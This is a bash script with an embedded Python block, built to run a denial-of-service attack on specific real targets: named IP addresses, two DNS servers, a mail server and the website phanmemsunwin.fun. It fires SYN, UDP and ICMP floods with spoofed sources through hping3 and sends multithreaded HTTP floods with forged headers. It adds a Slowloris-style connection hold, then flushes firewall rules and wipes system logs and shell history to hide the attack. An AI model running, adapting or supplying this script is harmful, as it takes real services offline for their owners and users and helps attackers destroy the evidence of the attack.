#!/bin/bash
# CONFIG
TARGET_MAIN="103.252.137.187"
TARGET_DNS1="ns11.dvd.vn"
TARGET_DNS2="ns12.dvd.vn"
TARGET_MAIL="103.252.137.126"
TARGET_WEB="phanmemsunwin.fun"

# KILL SWITCH - XÓA LOGS
clean_logs() {
    sudo iptables -F
    sudo iptables -X
    sudo echo "" > /var/log/syslog
    sudo echo "" > /var/log/auth.log
    rm -f ~/.bash_history
    history -c
}

# SYN FLOOD MAX POWER
sudo hping3 -S --flood --rand-source -p 80 $TARGET_MAIN &
sudo hping3 -S --flood --rand-source -p 443 $TARGET_MAIN &
sudo hping3 -S --flood --rand-source -p 22 $TARGET_MAIN &
sudo hping3 --udp --flood --rand-source -p 53 $TARGET_MAIN &
sudo hping3 --icmp --flood --rand-source $TARGET_MAIN &

# DNS SERVER FUCK
sudo hping3 -S --flood --rand-source -p 53 $TARGET_DNS1 &
sudo hping3 -S --flood --rand-source -p 53 $TARGET_DNS2 &
sudo hping3 --udp --flood --rand-source -p 53 $TARGET_DNS1 &
sudo hping3 --udp --flood --rand-source -p 53 $TARGET_DNS2 &

# MAIL SERVER DESTROY
sudo hping3 -S --flood --rand-source -p 25 $TARGET_MAIL &
sudo hping3 -S --flood --rand-source -p 110 $TARGET_MAIL &
sudo hping3 -S --flood --rand-source -p 143 $TARGET_MAIL &
sudo hping3 -S --flood --rand-source -p 465 $TARGET_MAIL &
sudo hping3 -S --flood --rand-source -p 587 $TARGET_MAIL &
sudo hping3 -S --flood --rand-source -p 993 $TARGET_MAIL &

# HTTP FLOOD NÂNG CẤP
python3 -c "
import requests
import threading
import random
import socket
import struct

targets = ['http://$TARGET_MAIN', 'http://$TARGET_WEB']
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)'
]

def random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def attack():
    while True:
        try:
            for target in targets:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'X-Forwarded-For': random_ip(),
                    'X-Real-IP': random_ip(),
                    'Referer': 'http://phanmemsunwin.fun'
                }
                
                requests.get(target, headers=headers, timeout=1)
                requests.post(target, headers=headers, 
                            data={'param': random.randint(1000,9999)}, 
                            timeout=1)
                
                # Slowloris attack
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('$TARGET_MAIN', 80))
                s.send('GET / HTTP/1.1\r\nHost: $TARGET_WEB\r\n'.encode())
                while True:
                    s.send('X-a: {}\r\n'.format(random.randint(1,5000)).encode())
        except:
            pass

for i in range(500):
    threading.Thread(target=attack, daemon=True).start()
"

# DDOS PROTECTION BYPASS
sudo sysctl -w net.ipv4.ip_default_ttl=255
sudo sysctl -w net.ipv4.ip_forward=0

# CLEAN TRACKS
clean_logs

# KEEP ALIVE MOTHERFUCKER
while true; do
    sleep 999999
    clean_logs
done



apt install hping3